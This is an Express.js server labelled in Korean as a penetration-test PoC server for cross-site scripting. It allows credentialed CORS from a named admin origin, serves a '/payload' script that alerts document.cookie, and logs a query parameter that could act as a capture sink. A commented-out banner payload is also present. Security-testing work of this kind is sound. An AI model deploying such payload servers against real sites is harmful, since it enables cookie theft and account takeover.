var express = require('express');
var cors = require('cors');
var app = express();

// 허용할 origin을 지정
var allowedOrigin = 'https://dev-admin.cloudz.co.kr';
// CORS 옵션
var corsOptions = {
  origin: allowedOrigin,
  methods: ['GET','POST','OPTIONS'],
  // jQuery가 자동으로 보내는 X-Requested-With 를 허용
  allowedHeaders: ['Content-Type', 'X-Requested-With'],
  credentials: true,
  optionsSuccessStatus: 204
};

// CORS 미들웨어 (전역)
app.use(cors(corsOptions));


app.get('/payload', function(req, res) {
    var js = "alert(document.cookie);";
    //var js = $('#out').text('XSS confirmed at' + new Date().toISOString());	
    res.status(200).set('Content-Type', 'text/javascript').send(js);
});


// index.js (일부)
/*app.get('/payload', function(req, res) {
  // 메시지는 JSON.stringify로 안전하게 이스케이프
  var message = 'XSS confirmed at ' + new Date().toISOString();
  var safeMsg = JSON.stringify(message);

  // 결과를 시각적으로 확실하게 보여주는 스크립트
  var js = `
    // PoC visual banner - non-destructive
    (function(){
      try{
        console.log('POC: visual payload executed at ' + new Date().toISOString());

        // 이미 존재하면 갱신
        var existing = document.getElementById('__poc_xss_banner__');
        if(existing){
          existing.textContent = ${safeMsg};
          return;
        }

        // 스타일링이 눈에 띄도록 만든다
        var banner = document.createElement('div');
        banner.id = '__poc_xss_banner__';
        banner.textContent = ${safeMsg};
		banner.style.position = 'fixed';
		banner.style.left = '50%';
		banner.style.top = '50%';
		banner.style.transform = 'translate(-50%, -50%)';
		banner.style.zIndex = 2147483647;
		banner.style.background = 'linear-gradient(90deg, #ff4d4d, #ff9999)';
		banner.style.color = '#fff';
		banner.style.fontSize = '18px';
		banner.style.fontWeight = '700';
		banner.style.padding = '14px 24px';
		banner.style.borderRadius = '8px';
		banner.style.boxShadow = '0 6px 18px rgba(0,0,0,0.35)';
		banner.style.textAlign = 'center';
		banner.style.fontFamily = 'Arial, sans-serif';
		banner.style.opacity = '0.98';
		banner.style.pointerEvents = 'none'; // 배너 자체 비인터랙티브

        // 닫기 버튼(선택)
        var closeBtn = document.createElement('button');
        closeBtn.textContent = '×';
        closeBtn.style.position = 'absolute';
        closeBtn.style.right = '8px';
        closeBtn.style.top = '6px';
        closeBtn.style.background = 'transparent';
        closeBtn.style.border = 'none';
        closeBtn.style.color = '#fff';
        closeBtn.style.fontSize = '20px';
        closeBtn.style.cursor = 'pointer';
        closeBtn.style.pointerEvents = 'auto'; // 닫기 버튼은 클릭 허용
        closeBtn.onclick = function(e){
          e.stopPropagation();
          var b = document.getElementById('__poc_xss_banner__');
          if(b) b.parentNode.removeChild(b);
        };

        banner.appendChild(closeBtn);

        document.documentElement.appendChild(banner);
      } catch(e) {
        console.log('POC exec error', e);
      }
    })();
  `;

  res.status(200).type('text/javascript').send(js);
});*/








app.listen(3000, function() {
    console.log("start! express server on port 3000")
})




// request 와 response 라는 인자를 줘서 콜백 함수를 만든다.
app.get('/', function(req, res) {
    res.statusCode = 200;
    res.setHeader('Content-Type', 'text/html');
    res.end(`
        <!DOCTYPE html>
        <html lang="ko">
        <head>
            <meta charset="UTF-8">
            <title>SK 쉴더스 Poc Test Server</title>
            <style>
                body {
                    font-family: 'Nanum Gothic', 'Arial', sans-serif; /* 한국어도 예쁘게 나오는 폰트 */
                    font-size: 36px;       /* 글자 크기 */
                    color: #ffffff;        /* 글자 색상 */
                    background-color: #34495e; /* 배경 색상 */
                    display: flex;
                    justify-content: center;
                    align-items: center;
                    height: 100vh;
                    margin: 0;
                }
                .container {
                    text-align: center;
                    padding: 20px 40px;
                    background-color: rgba(0,0,0,0.4);
                    border-radius: 15px;
                    box-shadow: 0 4px 15px rgba(0,0,0,0.3);
                }
            </style>
        </head>
        <body>
            <div class="container">
                SK 쉴더스 Poc Test Server
            </div>
        </body>
        </html>
    `);

    console.log({data: req.query.muffin});
});


